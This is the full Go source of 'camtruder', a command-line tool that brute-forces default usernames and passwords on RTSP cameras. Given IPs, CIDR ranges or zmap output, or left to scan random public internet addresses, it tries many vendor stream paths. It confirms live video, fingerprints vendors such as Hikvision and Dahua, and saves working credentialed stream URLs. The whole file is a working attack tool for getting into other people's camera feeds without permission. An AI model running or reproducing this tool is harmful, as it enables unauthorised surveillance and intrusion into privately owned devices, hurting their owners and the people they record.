package main

import (
	"bufio"
	"crypto/rand"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/bluenviron/gortsplib/v4"
	"github.com/bluenviron/gortsplib/v4/pkg/base"
	"github.com/bluenviron/gortsplib/v4/pkg/description"
	"github.com/bluenviron/gortsplib/v4/pkg/format"
	"github.com/common-nighthawk/go-figure"
	"github.com/pion/rtp"
	"github.com/projectdiscovery/gologger"
	"github.com/projectdiscovery/gologger/levels"
)

const usage = `
Usage:
  Single IP:     camtruder -t 192.168.1.100
  IP Range:      camtruder -t 192.168.1.0/24
  Multiple IPs:  camtruder -t ips.txt
  From pipe:     zmap -p554 -N 10 | camtruder

Options:
  -t  <ip/file>    Target IP, CIDR range, or file with IPs
  -u  <input>      Custom username(s) [file or comma separated list]
  -p  <input>      Custom password(s) [file or comma separated list]
  -w  <num>        Number of threads (default: 10)
  -to <seconds>    Timeout (default: 5)
  -o  <file>       Output file
  -v               Verbose output

Examples:
  # Scan single IP with default credentials
  camtruder -t 192.168.1.100

  # Scan network range with custom credentials
  camtruder -t 192.168.1.0/24 -u admin,root -p pass123,admin123

  # Scan IPs from file with increased threads
  camtruder -t targets.txt -w 50

  # Scan from zmap output with custom timeout
  zmap -p554 192.168.0.0/16 | camtruder -to 10

  # Save results to file with verbose output
  camtruder -t 10.0.0.0/24 -o results.txt -v
`

var defaultUsers = []string{
	"admin", "root", "service", "supervisor", "user",
	"Admin", "administrator", "666666", "888888",
}

var defaultPasswords = []string{
	"", "admin", "12345", "123456", "1234", "12345678", "admin123", "root", "password",
	"pass", "root123",
}

var defaultPaths = []string{
	// Root and basic paths
	"/",
	"/live",
	"/h264",
	"/mpeg4",
	"/main",
	"/media",
	"/stream",

	// Live stream variations
	"/live/main",
	"/live/sub",
	"/live/ch0",
	"/live/ch1",
	"/live/ch2",
	"/live/ch3",
	"/live/ch00_0",
	"/live/ch01_0",
	"/live/ch02_0",
	"/live/ch03_0",

	// H264 variations
	"/h264/ch01/main/av_stream",
	"/h264/media.amp",
	"/h264/ch1/main",
	"/h264/ch1/sub",

	// MPEG4 variations
	"/mpeg4/media.amp",
	"/mpeg4/1/media.amp",
	"/mpeg4cif",
	"/mpeg4unicast",

	// Channel variations
	"/ch0",
	"/ch1",
	"/ch2",
	"/ch3",
	"/cam0",
	"/cam1",
	"/cam2",
	"/cam3",
	"/cam0_0",
	"/cam1_0",
	"/cam2_0",
	"/cam3_0",

	// Streaming paths
	"/Streaming/Channels/1",
	"/Streaming/Unicast/channels/101",

	// Onvif style paths
	"/cam/realmonitor?channel=0&subtype=0&unicast=true&proto=Onvif",
	"/cam/realmonitor?channel=1&subtype=0&unicast=true&proto=Onvif",
	"/cam/realmonitor?channel=2&subtype=0&unicast=true&proto=Onvif",
	"/cam/realmonitor?channel=3&subtype=0&unicast=true&proto=Onvif",

	// Credential-based paths (will be processed by replaceCreds)
	"/0/1:1/main",
	"/0/usrnm:pwd/main",
	"/0/video1",
	"/user=admin&password=&channel=1&stream=0.sdp?",
	"/user=admin&password=&channel=2&stream=0.sdp?",
	"/user=admin&password=&channel=1&stream=0.sdp?real_stream",
	"/user=admin&password=&channel=2&stream=0.sdp?real_stream",

	// Additional formats
	"/av0_0",
	"/av0_1",
	"/video1",
	"/video.mp4",
	"/video1+audio1",
	"/video.pro1",
	"/video.pro2",
	"/video.pro3",
	"/MediaInput/h264",
	"/MediaInput/mpeg4",
	"/axis-media/media.amp",
	"/11",
	"/12",
	"/1",
	"/1.amp",
	"/stream1",
	"/bystreamnum/0",
	"/profile1",
	"/media/video1",
	"/ucast/11",

	// Settings paths
	"/StreamingSetting?version=1.0&action=getRTSPStream&ChannelID=1&ChannelName=Channel1",
}

var verbose bool
var successMap sync.Map
var found int32
var start time.Time
var warnedIPs sync.Map
var foundPaths sync.Map
var targetLimit int32
var attemptedIPs sync.Map

type Credentials struct {
	Username string
	Password string
}

const (
	colorReset        = "\033[0m"
	colorRed          = "\033[31m"
	colorGreen        = "\033[32m"
	colorYellow       = "\033[33m"
	colorBlue         = "\033[34m"
	colorPurple       = "\033[35m"
	colorCyan         = "\033[36m"
	colorWhite        = "\033[37m"
	colorBold         = "\033[1m"
	maxParallelChecks = 1000 // Maximum parallel host checks
)

func parseInput(input string) []string {
	// If input is empty, return nil
	if input == "" {
		return nil
	}

	// Check if it's a file
	if _, err := os.Stat(input); err == nil {
		return readLines(input)
	}

	// Split by comma if contains comma
	if strings.Contains(input, ",") {
		items := strings.Split(input, ",")
		// Trim spaces from each item
		for i, item := range items {
			items[i] = strings.TrimSpace(item)
		}
		return items
	}

	// Single item
	return []string{input}
}

func expandCIDR(cidr string) []string {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return []string{cidr} // Return as-is if not CIDR
	}

	var ips []string
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incrementIP(ip) {
		ips = append(ips, ip.String())
	}

	// Remove network and broadcast address
	if len(ips) > 2 {
		ips = ips[1 : len(ips)-1]
	}
	return ips
}

func incrementIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func generateRandomIP() string {
	// Generate random IP but avoid reserved ranges
	for {
		ip := make([]byte, 4)
		_, err := rand.Read(ip)
		if err != nil {
			continue
		}

		// Skip private, loopback, multicast ranges
		if ip[0] == 10 || // 10.0.0.0/8
			(ip[0] == 172 && ip[1] >= 16 && ip[1] <= 31) || // 172.16.0.0/12
			(ip[0] == 192 && ip[1] == 168) || // 192.168.0.0/16
			ip[0] == 127 || // 127.0.0.0/8
			ip[0] == 0 || // 0.0.0.0/8
			ip[0] == 169 && ip[1] == 254 || // 169.254.0.0/16
			ip[0] >= 224 || // 224.0.0.0/4 and above
			ip[0] == 192 && ip[1] == 0 && ip[2] == 2 { // 192.0.2.0/24
			continue
		}

		return fmt.Sprintf("%d.%d.%d.%d:554", ip[0], ip[1], ip[2], ip[3])
	}
}

func incrementFound(ip string) bool {
	if _, exists := successMap.LoadOrStore(ip, true); !exists {
		atomic.AddInt32(&found, 1)
		return true
	}
	return false
}

func main() {
	// Configure gologger
	gologger.DefaultLogger.SetMaxLevel(levels.LevelDebug)

	// Parse command line flags
	flag.Usage = func() {
		fmt.Print(figure.NewFigure("     camtruder", "cybermedium", true))
		println()
		fmt.Printf("%s\t\t\t%sv2.0%s by @alw1ez\n", colorYellow, colorBold, colorReset)
		fmt.Printf("\t\t   %sRTSP Camera Discovery Tool%s\n", colorBlue, colorReset)
		fmt.Println(colorPurple + strings.Repeat("─", 67) + colorReset)
		fmt.Fprintf(os.Stderr, "%s", usage)
	}

	target := flag.String("t", "", "")
	userInput := flag.String("u", "", "")
	passInput := flag.String("p", "", "")
	threads := flag.Int("w", 20, "")
	timeout := flag.Int("to", 3, "")
	output := flag.String("o", "", "")
	flag.BoolVar(&verbose, "v", false, "")
	flag.Parse()

	start = time.Now()

	// Get credentials list first
	var users, passwords []string
	if *userInput != "" {
		users = parseInput(*userInput)
		if users == nil {
			log.Fatal("Invalid username input")
		}
	} else {
		users = defaultUsers
	}

	if *passInput != "" {
		passwords = parseInput(*passInput)
		if passwords == nil {
			log.Fatal("Invalid password input")
		}
	} else {
		passwords = defaultPasswords
	}

	// Create work channel and wait group
	work := make(chan struct {
		IP   string
		Cred Credentials
		Path string
	})
	var wg sync.WaitGroup

	// Create output file if specified
	var outFile *os.File
	if *output != "" {
		var err error
		outFile, err = os.Create(*output)
		if err != nil {
			log.Fatalf("Failed to create output file: %v", err)
		}
		defer outFile.Close()
	}

	// Declare variables used in both scan modes
	duration := time.Since(start)
	outputStr := ""
	if *output != "" {
		outputStr = fmt.Sprintf("\n Output : %s", *output)
	}
	actualThreads := *threads
	if actualThreads > maxParallelChecks {
		actualThreads = maxParallelChecks
	}

	// Process targets
	var targets []string
	if *target == "" {
		stat, _ := os.Stdin.Stat()
		if (stat.Mode() & os.ModeCharDevice) != 0 {
			flag.Usage()
			os.Exit(1)
		}
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			expanded := expandCIDR(scanner.Text())
			for _, ip := range expanded {
				targets = append(targets, formatIP(ip))
			}
		}
	} else {
		// Check if target is a number (limit for found cameras)
		if limit, err := strconv.Atoi(*target); err == nil {
			targetLimit = int32(limit)
			if verbose {
				fmt.Printf("%s Scanning internet until finding %d vulnerable cameras...%s\n",
					colorBold, limit, colorReset)
			}

			// Show banner and info before starting scan
			fmt.Print(figure.NewFigure("     camtruder", "cybermedium", true))
			println()
			fmt.Printf("%s\t\t\t%sv3.0%s by @alw1ez\n", colorYellow, colorBold, colorReset)
			fmt.Printf("\t\t   %sRTSP Camera Discovery Tool%s\n", colorBlue, colorReset)
			fmt.Println(colorPurple + strings.Repeat("─", 67) + colorReset)

			fmt.Printf("%s Internet Scan | Limit: %d | Users: %d | Passwords: %d | Threads: %d%s%s\n",
				colorBold, limit, len(users), len(passwords), actualThreads, outputStr, colorReset)
			println()

			remainingLimit := targetLimit
			for atomic.LoadInt32(&found) < targetLimit {
				// Find IPs with open port 554
				if verbose {
					fmt.Printf("%s Searching for %d hosts with port 554 open...%s\n",
						colorBold, remainingLimit, colorReset)
				}
				targets := findOpenPorts(remainingLimit, time.Duration(*timeout)*time.Second)
				if verbose {
					fmt.Printf("%s Found %d hosts with port 554 open%s\n",
						colorBold, len(targets), colorReset)
				}

				if len(targets) == 0 {
					continue
				}

				// Start worker threads for RTSP scanning
				for i := 0; i < actualThreads; i++ {
					wg.Add(1)
					go worker(work, &wg, time.Duration(*timeout)*time.Second, outFile)
				}

				// Scan found IPs
				for _, ip := range targets {
					for _, user := range users {
						for _, pass := range passwords {
							work <- struct {
								IP   string
								Cred Credentials
								Path string
							}{
								IP: ip,
								Cred: Credentials{
									Username: user,
									Password: pass,
								},
								Path: "/",
							}
						}
					}
				}
				close(work)
				wg.Wait()

				// Update remaining limit
				remainingLimit = targetLimit - atomic.LoadInt32(&found)
				if remainingLimit <= 0 {
					break
				}

				// Create new work channel for next batch
				work = make(chan struct {
					IP   string
					Cred Credentials
					Path string
				})
			}
			printResults(duration, *output)
			return
		} else if _, err := os.Stat(*target); err == nil {
			// Reading from file
			lines := readLines(*target)
			for _, line := range lines {
				expanded := expandCIDR(line)
				for _, ip := range expanded {
					targets = append(targets, formatIP(ip))
				}
			}
		} else {
			// Single target - might be CIDR
			expanded := expandCIDR(*target)
			for _, ip := range expanded {
				targets = append(targets, formatIP(ip))
			}
		}
	}

	if len(targets) == 0 {
		flag.Usage()
		os.Exit(1)
	}

	// Show banner and info
	fmt.Print(figure.NewFigure("     camtruder", "cybermedium", true))
	println()
	fmt.Printf("%s\t\t\t%sv2.0%s by @alw1ez\n", colorYellow, colorBold, colorReset)
	fmt.Printf("\t\t   %sRTSP Camera Discovery Tool%s\n", colorBlue, colorReset)
	fmt.Println(colorPurple + strings.Repeat("─", 67) + colorReset)

	outputStr = ""
	if *output != "" {
		outputStr = fmt.Sprintf("\n Output : %s", *output)
	}
	fmt.Printf("%s Targets: %d | Users: %d | Passwords: %d | Threads: %d%s%s\n", colorBold, len(targets), len(users), len(passwords), *threads, outputStr, colorReset)
	println()

	// Start regular scan worker threads
	if actualThreads > maxParallelChecks {
		actualThreads = maxParallelChecks
		fmt.Printf("%s Limiting parallel checks to %d for better performance%s\n",
			colorYellow, maxParallelChecks, colorReset)
	}
	for i := 0; i < actualThreads; i++ {
		wg.Add(1)
		go worker(work, &wg, time.Duration(*timeout)*time.Second, outFile)
	}

	// Feed work for regular scan
	for _, user := range users {
		for _, pass := range passwords {
			for _, ip := range targets {
				work <- struct {
					IP   string
					Cred Credentials
					Path string
				}{
					IP: ip,
					Cred: Credentials{
						Username: user,
						Password: pass,
					},
					Path: "/",
				}
			}
		}
	}
	close(work)
	wg.Wait()
	printResults(duration, *output)
}

func worker(work chan struct {
	IP   string
	Cred Credentials
	Path string
}, wg *sync.WaitGroup, timeout time.Duration, outFile *os.File) {
	defer wg.Done()

	testedCreds := make(map[string]bool)

	for job := range work {
		// Check if we've reached the target limit
		if targetLimit > 0 && atomic.LoadInt32(&found) >= targetLimit {
			return
		}

		// Skip if IP was already successfully scanned
		if _, found := successMap.Load(job.IP); found {
			continue
		}

		// Mark IP as attempted
		attemptedIPs.Store(job.IP, true)

		credKey := fmt.Sprintf("%s_%s_%s", job.IP, job.Cred.Username, job.Cred.Password)
		if testedCreds[credKey] {
			continue
		}
		testedCreds[credKey] = true

		if verbose {
			gologger.Debug().Label("TEST").Msgf("%s [%s:%s]",
				job.IP, job.Cred.Username, job.Cred.Password)
		}

		// First test credentials with root path
		rootURL := fmt.Sprintf("rtsp://%s:%s@%s/",
			job.Cred.Username,
			job.Cred.Password,
			job.IP)

		rootSuccess, rootResponse := testCredentials(rootURL, timeout)
		if rootSuccess {
			if targetLimit > 0 && atomic.LoadInt32(&found) >= targetLimit {
				return
			}
			fingerprint := getFingerprint(rootResponse, rootURL)
			// Only increment and report if this IP hasn't been found before
			if incrementFound(job.IP) {
				gologger.Info().Msgf("╭─ %sFound vulnerable camera%s %s[%s]%s", colorGreen, colorReset, colorYellow, fingerprint, colorReset)
				gologger.Info().Msgf("%s├ Host      :%s %s", colorBold, colorReset, job.IP)
				gologger.Info().Msgf("%s├ Auth      :%s %s:%s", colorBold, colorReset, job.Cred.Username, job.Cred.Password)
				gologger.Info().Msgf("%s├ Path      :%s %s", colorBold, colorReset, "Accepts any path")
				gologger.Info().Msgf("%s╰ URL       :%s %s", colorBold, colorReset, rootURL)
				fmt.Println()
				if verbose {
					gologger.Info().Label("RESP").Msgf("\n%s", rootResponse)
				}
				writeResult(rootURL, outFile)
			}
			continue
		}

		// If root doesn't work, try dummy path to check credentials
		testURL := fmt.Sprintf("rtsp://%s:%s@%s/DUMMY_TEST_PATH_123456789",
			job.Cred.Username,
			job.Cred.Password,
			job.IP)

		success, response := testCredentials(testURL, timeout)
		if success || strings.Contains(response, "404") {
			if verbose {
				gologger.Info().Label("VALID").Msgf("Found credentials for %s [%s:%s]",
					job.IP, job.Cred.Username, job.Cred.Password)
			}

			// Try all paths to find working ones
			foundValidPath := false
			for _, path := range defaultPaths {
				if path == "/" {
					continue // Skip root path as we already tested it
				}

				processedPath := replaceCreds(path, job.Cred.Username, job.Cred.Password)
				pathKey := fmt.Sprintf("%s:%s", job.IP, processedPath)

				if _, exists := foundPaths.Load(pathKey); exists {
					continue
				}

				pathURL := fmt.Sprintf("rtsp://%s:%s@%s%s",
					job.Cred.Username,
					job.Cred.Password,
					job.IP,
					processedPath)

				if verbose {
					gologger.Debug().Label("PATH").Msgf("Trying %s on %s", processedPath, job.IP)
				}

				pathSuccess, pathResponse := testCredentials(pathURL, timeout)
				if pathSuccess {
					if targetLimit > 0 && atomic.LoadInt32(&found) >= targetLimit {
						return
					}
					fingerprint := getFingerprint(pathResponse, pathURL)
					foundPaths.Store(pathKey, true)
					// Only increment and report if this IP hasn't been found before
					if incrementFound(job.IP) {
						result := fmt.Sprintf("rtsp://%s:%s@%s%s",
							job.Cred.Username,
							job.Cred.Password,
							job.IP,
							processedPath)
						gologger.Info().Msgf("╭─ %sFound vulnerable camera%s %s[%s]%s", colorGreen, colorReset, colorYellow, fingerprint, colorReset)
						gologger.Info().Msgf("%s├ Host      :%s %s", colorBold, colorReset, job.IP)
						gologger.Info().Msgf("%s├ Auth      :%s %s:%s", colorBold, colorReset, job.Cred.Username, job.Cred.Password)
						gologger.Info().Msgf("%s├ Path      :%s %s", colorBold, colorReset, processedPath)
						gologger.Info().Msgf("%s╰ URL       :%s %s", colorBold, colorReset, result)
						fmt.Println()
						if verbose {
							gologger.Info().Label("RESP").Msgf("\n%s", pathResponse)
						}
						writeResult(result, outFile)
					}
					foundValidPath = true
				} else if verbose && strings.Contains(pathResponse, "404") {
					gologger.Debug().Label("PATH").Msgf("Valid path format but no stream: %s", processedPath)
				}
			}

			if !foundValidPath && verbose {
				if _, warned := warnedIPs.LoadOrStore(job.IP, true); !warned {
					gologger.Warning().Msgf("%sValid credentials for %s but no working stream path%s", colorYellow, job.IP, colorReset)
				}
			}
		} else if verbose {
			gologger.Debug().Label("FAIL").Msgf("%s: %s", job.IP, response)
		}
	}
}

func testCredentials(rtspURL string, timeout time.Duration) (bool, string) {
	client := &gortsplib.Client{
		ReadTimeout:  timeout,
		WriteTimeout: timeout,
		// Ignore SSRC validation errors
		OnDecodeError: func(err error) {
			if !strings.Contains(err.Error(), "SSRC") {
				if verbose {
					gologger.Debug().Label("DECODE").Msgf("Error: %v", err)
				}
			}
		},
		Transport: func() *gortsplib.Transport {
			t := gortsplib.TransportTCP
			return &t
		}(),
	}

	u, err := base.ParseURL(rtspURL)
	if err != nil {
		return false, ""
	}

	err = client.Start(u.Scheme, u.Host)
	if err != nil {
		return false, fmt.Sprintf("Connection error: %v", err)
	}
	defer client.Close()

	// Try to get stream information with timeout
	descChan := make(chan struct {
		desc *description.Session
		resp *base.Response
		err  error
	}, 1)

	go func() {
		desc, resp, err := client.Describe(u)
		descChan <- struct {
			desc *description.Session
			resp *base.Response
			err  error
		}{desc, resp, err}
	}()

	select {
	case result := <-descChan:
		if result.err != nil {
			if strings.Contains(result.err.Error(), "401") {
				return false, fmt.Sprintf("Describe error: %v", result.err)
			}
			// Even if not 401, still require media validation
			if result.desc == nil || len(result.desc.Medias) == 0 {
				return false, fmt.Sprintf("No media streams: %v", result.err)
			}
		}

		// For credential checking only
		if strings.Contains(rtspURL, "DUMMY_TEST_PATH_123456789") {
			if result.desc != nil && len(result.desc.Medias) > 0 {
				return true, fmt.Sprintf("Response: %v", result.resp)
			}
			return false, "No media streams found"
		}

		// For actual stream validation
		if result.desc == nil || len(result.desc.Medias) == 0 {
			return false, "No media streams found"
		}

		// Try to setup and play
		err = client.SetupAll(u, result.desc.Medias)
		if err != nil {
			return false, fmt.Sprintf("Setup error: %v", err)
		}

		_, err = client.Play(nil)
		if err != nil {
			return false, fmt.Sprintf("Play error: %v", err)
		}

		// Quick packet check
		packetReceived := make(chan bool, 1)
		client.OnPacketRTPAny(func(medi *description.Media, forma format.Format, pkt *rtp.Packet) {
			select {
			case packetReceived <- true:
			default:
			}
		})

		// Wait briefly for a packet
		select {
		case <-packetReceived:
			return true, fmt.Sprintf("Response: %v", result.resp)
		case <-time.After(timeout):
			return false, "No packets received"
		}
	case <-time.After(timeout):
		return false, "Describe timeout"
	}
}

func formatIP(ip string) string {
	// If IP doesn't contain port, add default RTSP port
	if !strings.Contains(ip, ":") {
		return ip + ":554"
	}
	return ip
}

func readLines(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatalf("Failed to open file %s: %v", path, err)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}

	if err := scanner.Err(); err != nil {
		log.Fatalf("Error reading file %s: %v", path, err)
	}

	return lines
}

func writeResult(result string, outFile *os.File) {
	// If output file is specified, write to it
	if outFile != nil {
		fmt.Fprintln(outFile, result)
	}
}

func replaceCreds(path, username, password string) string {
	// Replace common credential placeholders in paths
	path = strings.ReplaceAll(path, "usrnm:pwd", username+":"+password)
	path = strings.ReplaceAll(path, "user=admin&password=", fmt.Sprintf("user=%s&password=%s", username, password))
	return path
}

func getFingerprint(response string, url string) string {
	var features []string

	// Vendor detection
	switch {
	case strings.Contains(response, "H264DVR"):
		features = append(features, "H264DVR")
	case strings.Contains(response, "Dahua"):
		features = append(features, "Dahua")
	case strings.Contains(response, "Hikvision"):
		features = append(features, "Hikvision")
	case strings.Contains(response, "Sony"):
		features = append(features, "Sony")
	case strings.Contains(response, "Axis"):
		features = append(features, "Axis")
	case strings.Contains(response, "Bosch"):
		features = append(features, "Bosch")
	}

	// Media type detection
	if strings.Contains(response, "H264/") {
		features = append(features, "H264")
	}
	if strings.Contains(response, "H265/") {
		features = append(features, "H265")
	}
	if strings.Contains(response, "m=audio") {
		features = append(features, "audio")
	}
	if strings.Contains(response, "multicast") {
		features = append(features, "multicast")
	}

	// Frame rate detection
	if framerate := regexp.MustCompile(`a=framerate:(\d+)`).FindStringSubmatch(response); len(framerate) > 1 {
		features = append(features, fmt.Sprintf("%sfps", framerate[1]))
	}

	// Path-based detection
	switch {
	case strings.Contains(url, "/live"):
		features = append(features, "live")
	case strings.Contains(url, "/cam"):
		features = append(features, "cam")
	case strings.Contains(url, "/media"):
		features = append(features, "media")
	}

	if len(features) == 0 {
		return "unknown"
	}

	return strings.Join(features, ", ")
}

func printResults(duration time.Duration, output string) {
	fmt.Printf("%s Scan completed in%s %s,", colorBold, colorReset, duration.Round(time.Second))
	fmt.Printf("%s found%s %s%d%s vulnerable cameras\n", colorBold, colorReset, colorGreen, found, colorReset)
	if output != "" {
		fmt.Printf("%s Results saved to%s %s\n", colorBold, colorReset, output)
	}
	fmt.Println(colorPurple + strings.Repeat("─", 67) + colorReset)
}

// Add this function to scan for open ports
func scanPort(ip string, timeout time.Duration) bool {
	conn, err := net.DialTimeout("tcp", ip, timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

// Add this function to find IPs with port 554 open
func findOpenPorts(limit int32, timeout time.Duration) []string {
	var openPorts []string
	var mutex sync.Mutex
	var wg sync.WaitGroup
	portChan := make(chan string, 1000)

	// Start port scanning workers
	for i := 0; i < 1000; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ip := range portChan {
				if scanPort(ip, timeout) {
					mutex.Lock()
					openPorts = append(openPorts, ip)
					mutex.Unlock()
					if verbose {
						gologger.Info().Msgf("Found open port: %s", ip)
					}
				}
			}
		}()
	}

	// Generate and send IPs until we find enough open ports
	go func() {
		attempts := 0
		maxAttempts := 1000000 // Prevent infinite loop

		for int32(len(openPorts)) < limit && attempts < maxAttempts {
			ip := generateRandomIP()

			// Skip if IP was already attempted
			if _, exists := attemptedIPs.LoadOrStore(ip, true); !exists {
				portChan <- ip
				attempts++

				// Periodically report progress if verbose
				if verbose && attempts%1000 == 0 {
					gologger.Debug().Msgf("Attempted %d IPs, found %d open ports",
						attempts, len(openPorts))
				}
			}
		}

		if attempts >= maxAttempts {
			gologger.Warning().Msgf("Reached maximum attempts (%d) while searching for open ports",
				maxAttempts)
		}
		close(portChan)
	}()

	wg.Wait()
	return openPorts
}
